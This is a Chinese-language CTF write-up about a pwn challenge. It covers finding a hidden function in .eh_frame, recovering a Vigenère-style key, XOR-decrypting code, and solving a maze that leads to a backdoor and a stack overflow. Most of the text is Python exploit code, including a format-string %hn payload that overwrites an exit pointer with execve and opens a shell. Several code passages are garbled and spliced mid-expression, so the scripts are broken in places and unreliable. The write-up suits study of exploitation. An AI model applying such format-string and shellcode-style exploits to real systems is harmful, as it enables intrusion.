**隐藏pwn：**
这题最有意思的是还隐藏了一个功能。
为了找到这个隐藏的功能，我使用qira查看运行的所有指令，发现刚连接上没有进行任何交互，就运行了12万多条指令。但qira只会记录主模块中的指令，显然不会这么多。最后发现程序运行到.eh_frame节中,同时发现是从0x4007db跳转过去的。发现是对puts_plt做了修改，而这种修改在ida中不太可能看出来。
后面就是分析.eh_frame中的函数的功能。
简单的通过分析汇编，发现是进行了一个比较，如果比较成功，就会调用mprotect的系统调用修改页的属性，对代码进行解密。不过前面比较部分的算法通过汇编阅读有点吃力，因此想办法进行修复，使ida能够成功反编译。
地址0x402A63处是一个push rbp，感觉是一个函数的开始地址。根据堆栈平衡，找到了pop rbp，按理pop
rbp之后应该是一个ret指令，因此这里进行patch，将pop rax修改为ret。然后在402A63处创建function，之后就能正常f5了。
进行简单修正之后得到如下反编译代码
写了个脚本求解了一下，发现只有puts打印的字符串为THESEVIOLENTDELIGHTSHAVEVIOLENTENDS程序能满足这个比较。
    base_str = 'HOOKEDBYYSYY'*3
    cmp_str = 'AVSCIYJMJWLRKSZSKKUQFSTCCWCVIQUCLVQ'
    d = {}
    for i in range(26):
        for j in range(26):
            d[i*26+j] = (i+j)%26+65
    flag = ''
    for k in range(len(cmp_str)):
        hang = ord(base_str[k]) - 65
        for m in range(26):
            if d[hang*26+m] == ord(cmp_str[k]):
                flag += chr(m + 65)
    print flag
在满足比较之后，程序会对0x401031处的2860个字节进行异或解密，然后跳转到401934。
在gdb中dump下解密后的0x401031处的数据，替换掉原来的之后，用ida打开，看到了隐藏的功能。
隐藏功能为生成一个迷宫，然后如果走出迷宫，就能进入到401658函数中，401658函数中存在后门和栈溢出。
    from zio import *
    def add(io, length, cmd):
        io.read_until('Exitn')
        io.writeline('1')
        io.read_until(':')
        io.writeline(str(length))
        io.read_until(':')
        io.writeline(cmd)
    def delete(io, id):
        io.read_until('Exitn')
        io.writeline('2')
        io.read_until(')')
        io.writeline(str(id))
    finalmg=[]
    def dfs(x,y,mg):
        global finalmg
        if x==0 and y==1:
            print "ok"
            finalmg=mg
            return 1
        if x-1>=0 and mg[x-1][y]==".":
            mg[x][y]="^"
            if dfs(x-1,y,mg):
                return 1
            mg[x][y]="."
        if x+1=0 and mg[x][y-1]==".":
            mg[x][y]=""
            if dfs(x,y+1,mg):
                return 1
            mg[x][y]="."
        return 0
    def solve_mg(mg):
        global finalmg
        finalmg=[]
        dfs(42,41,mg)
        for l in finalmg:
            print "".join(l)
        s=""
        for l in finalmg:
            for i in l:
                if i in ">> 16) & 0xffff
        write[1] = call_execve&0xffff
        #write[2] = system_hh
        printed = 0
        payload = ''
        for where, what in sorted(write.items(), key=operator.itemgetter(1)):
            delta = (what - printed) & 0xffff
            if delta > 0:
                if delta > 32) & 0xffff
        printed = 0
        payload = ''
        for where, what in sorted(write.items(), key=operator.itemgetter(1)):
            delta = (what - printed) & 0xffff
            if delta > 0:
                if delta < 8:
                    payload += 'A' * delta
                else:
                    payload += '%' + str(delta) + 'x'
            payload += '%' + str(43 + where) + '$hn'
            printed += delta
        newwarrior(io, 4, payload)
        for i in range(3):
            advance(io)
        attack(io)
        payload = 'attackx00x00'+l64(exit_fun)+l64(exit_fun+2)
        io.gdb_hint()
        attack2(io, payload)
        io.writeline('lalal')
        advance(io)
        advance(io)
        advance(io)
        newwarrior(io, 4, 'lll')
        advance(io)
        for i in range(2):
            attack(io)
        payload = 'attackx00x00'+l64(exit_fun+4)
        attack2(io, payload)
        io.read_until('your blue enemy')
        io.writeline('sh')
        io.read_until('$')
        io.writeline('exit')
        io.interact()
    exp(target)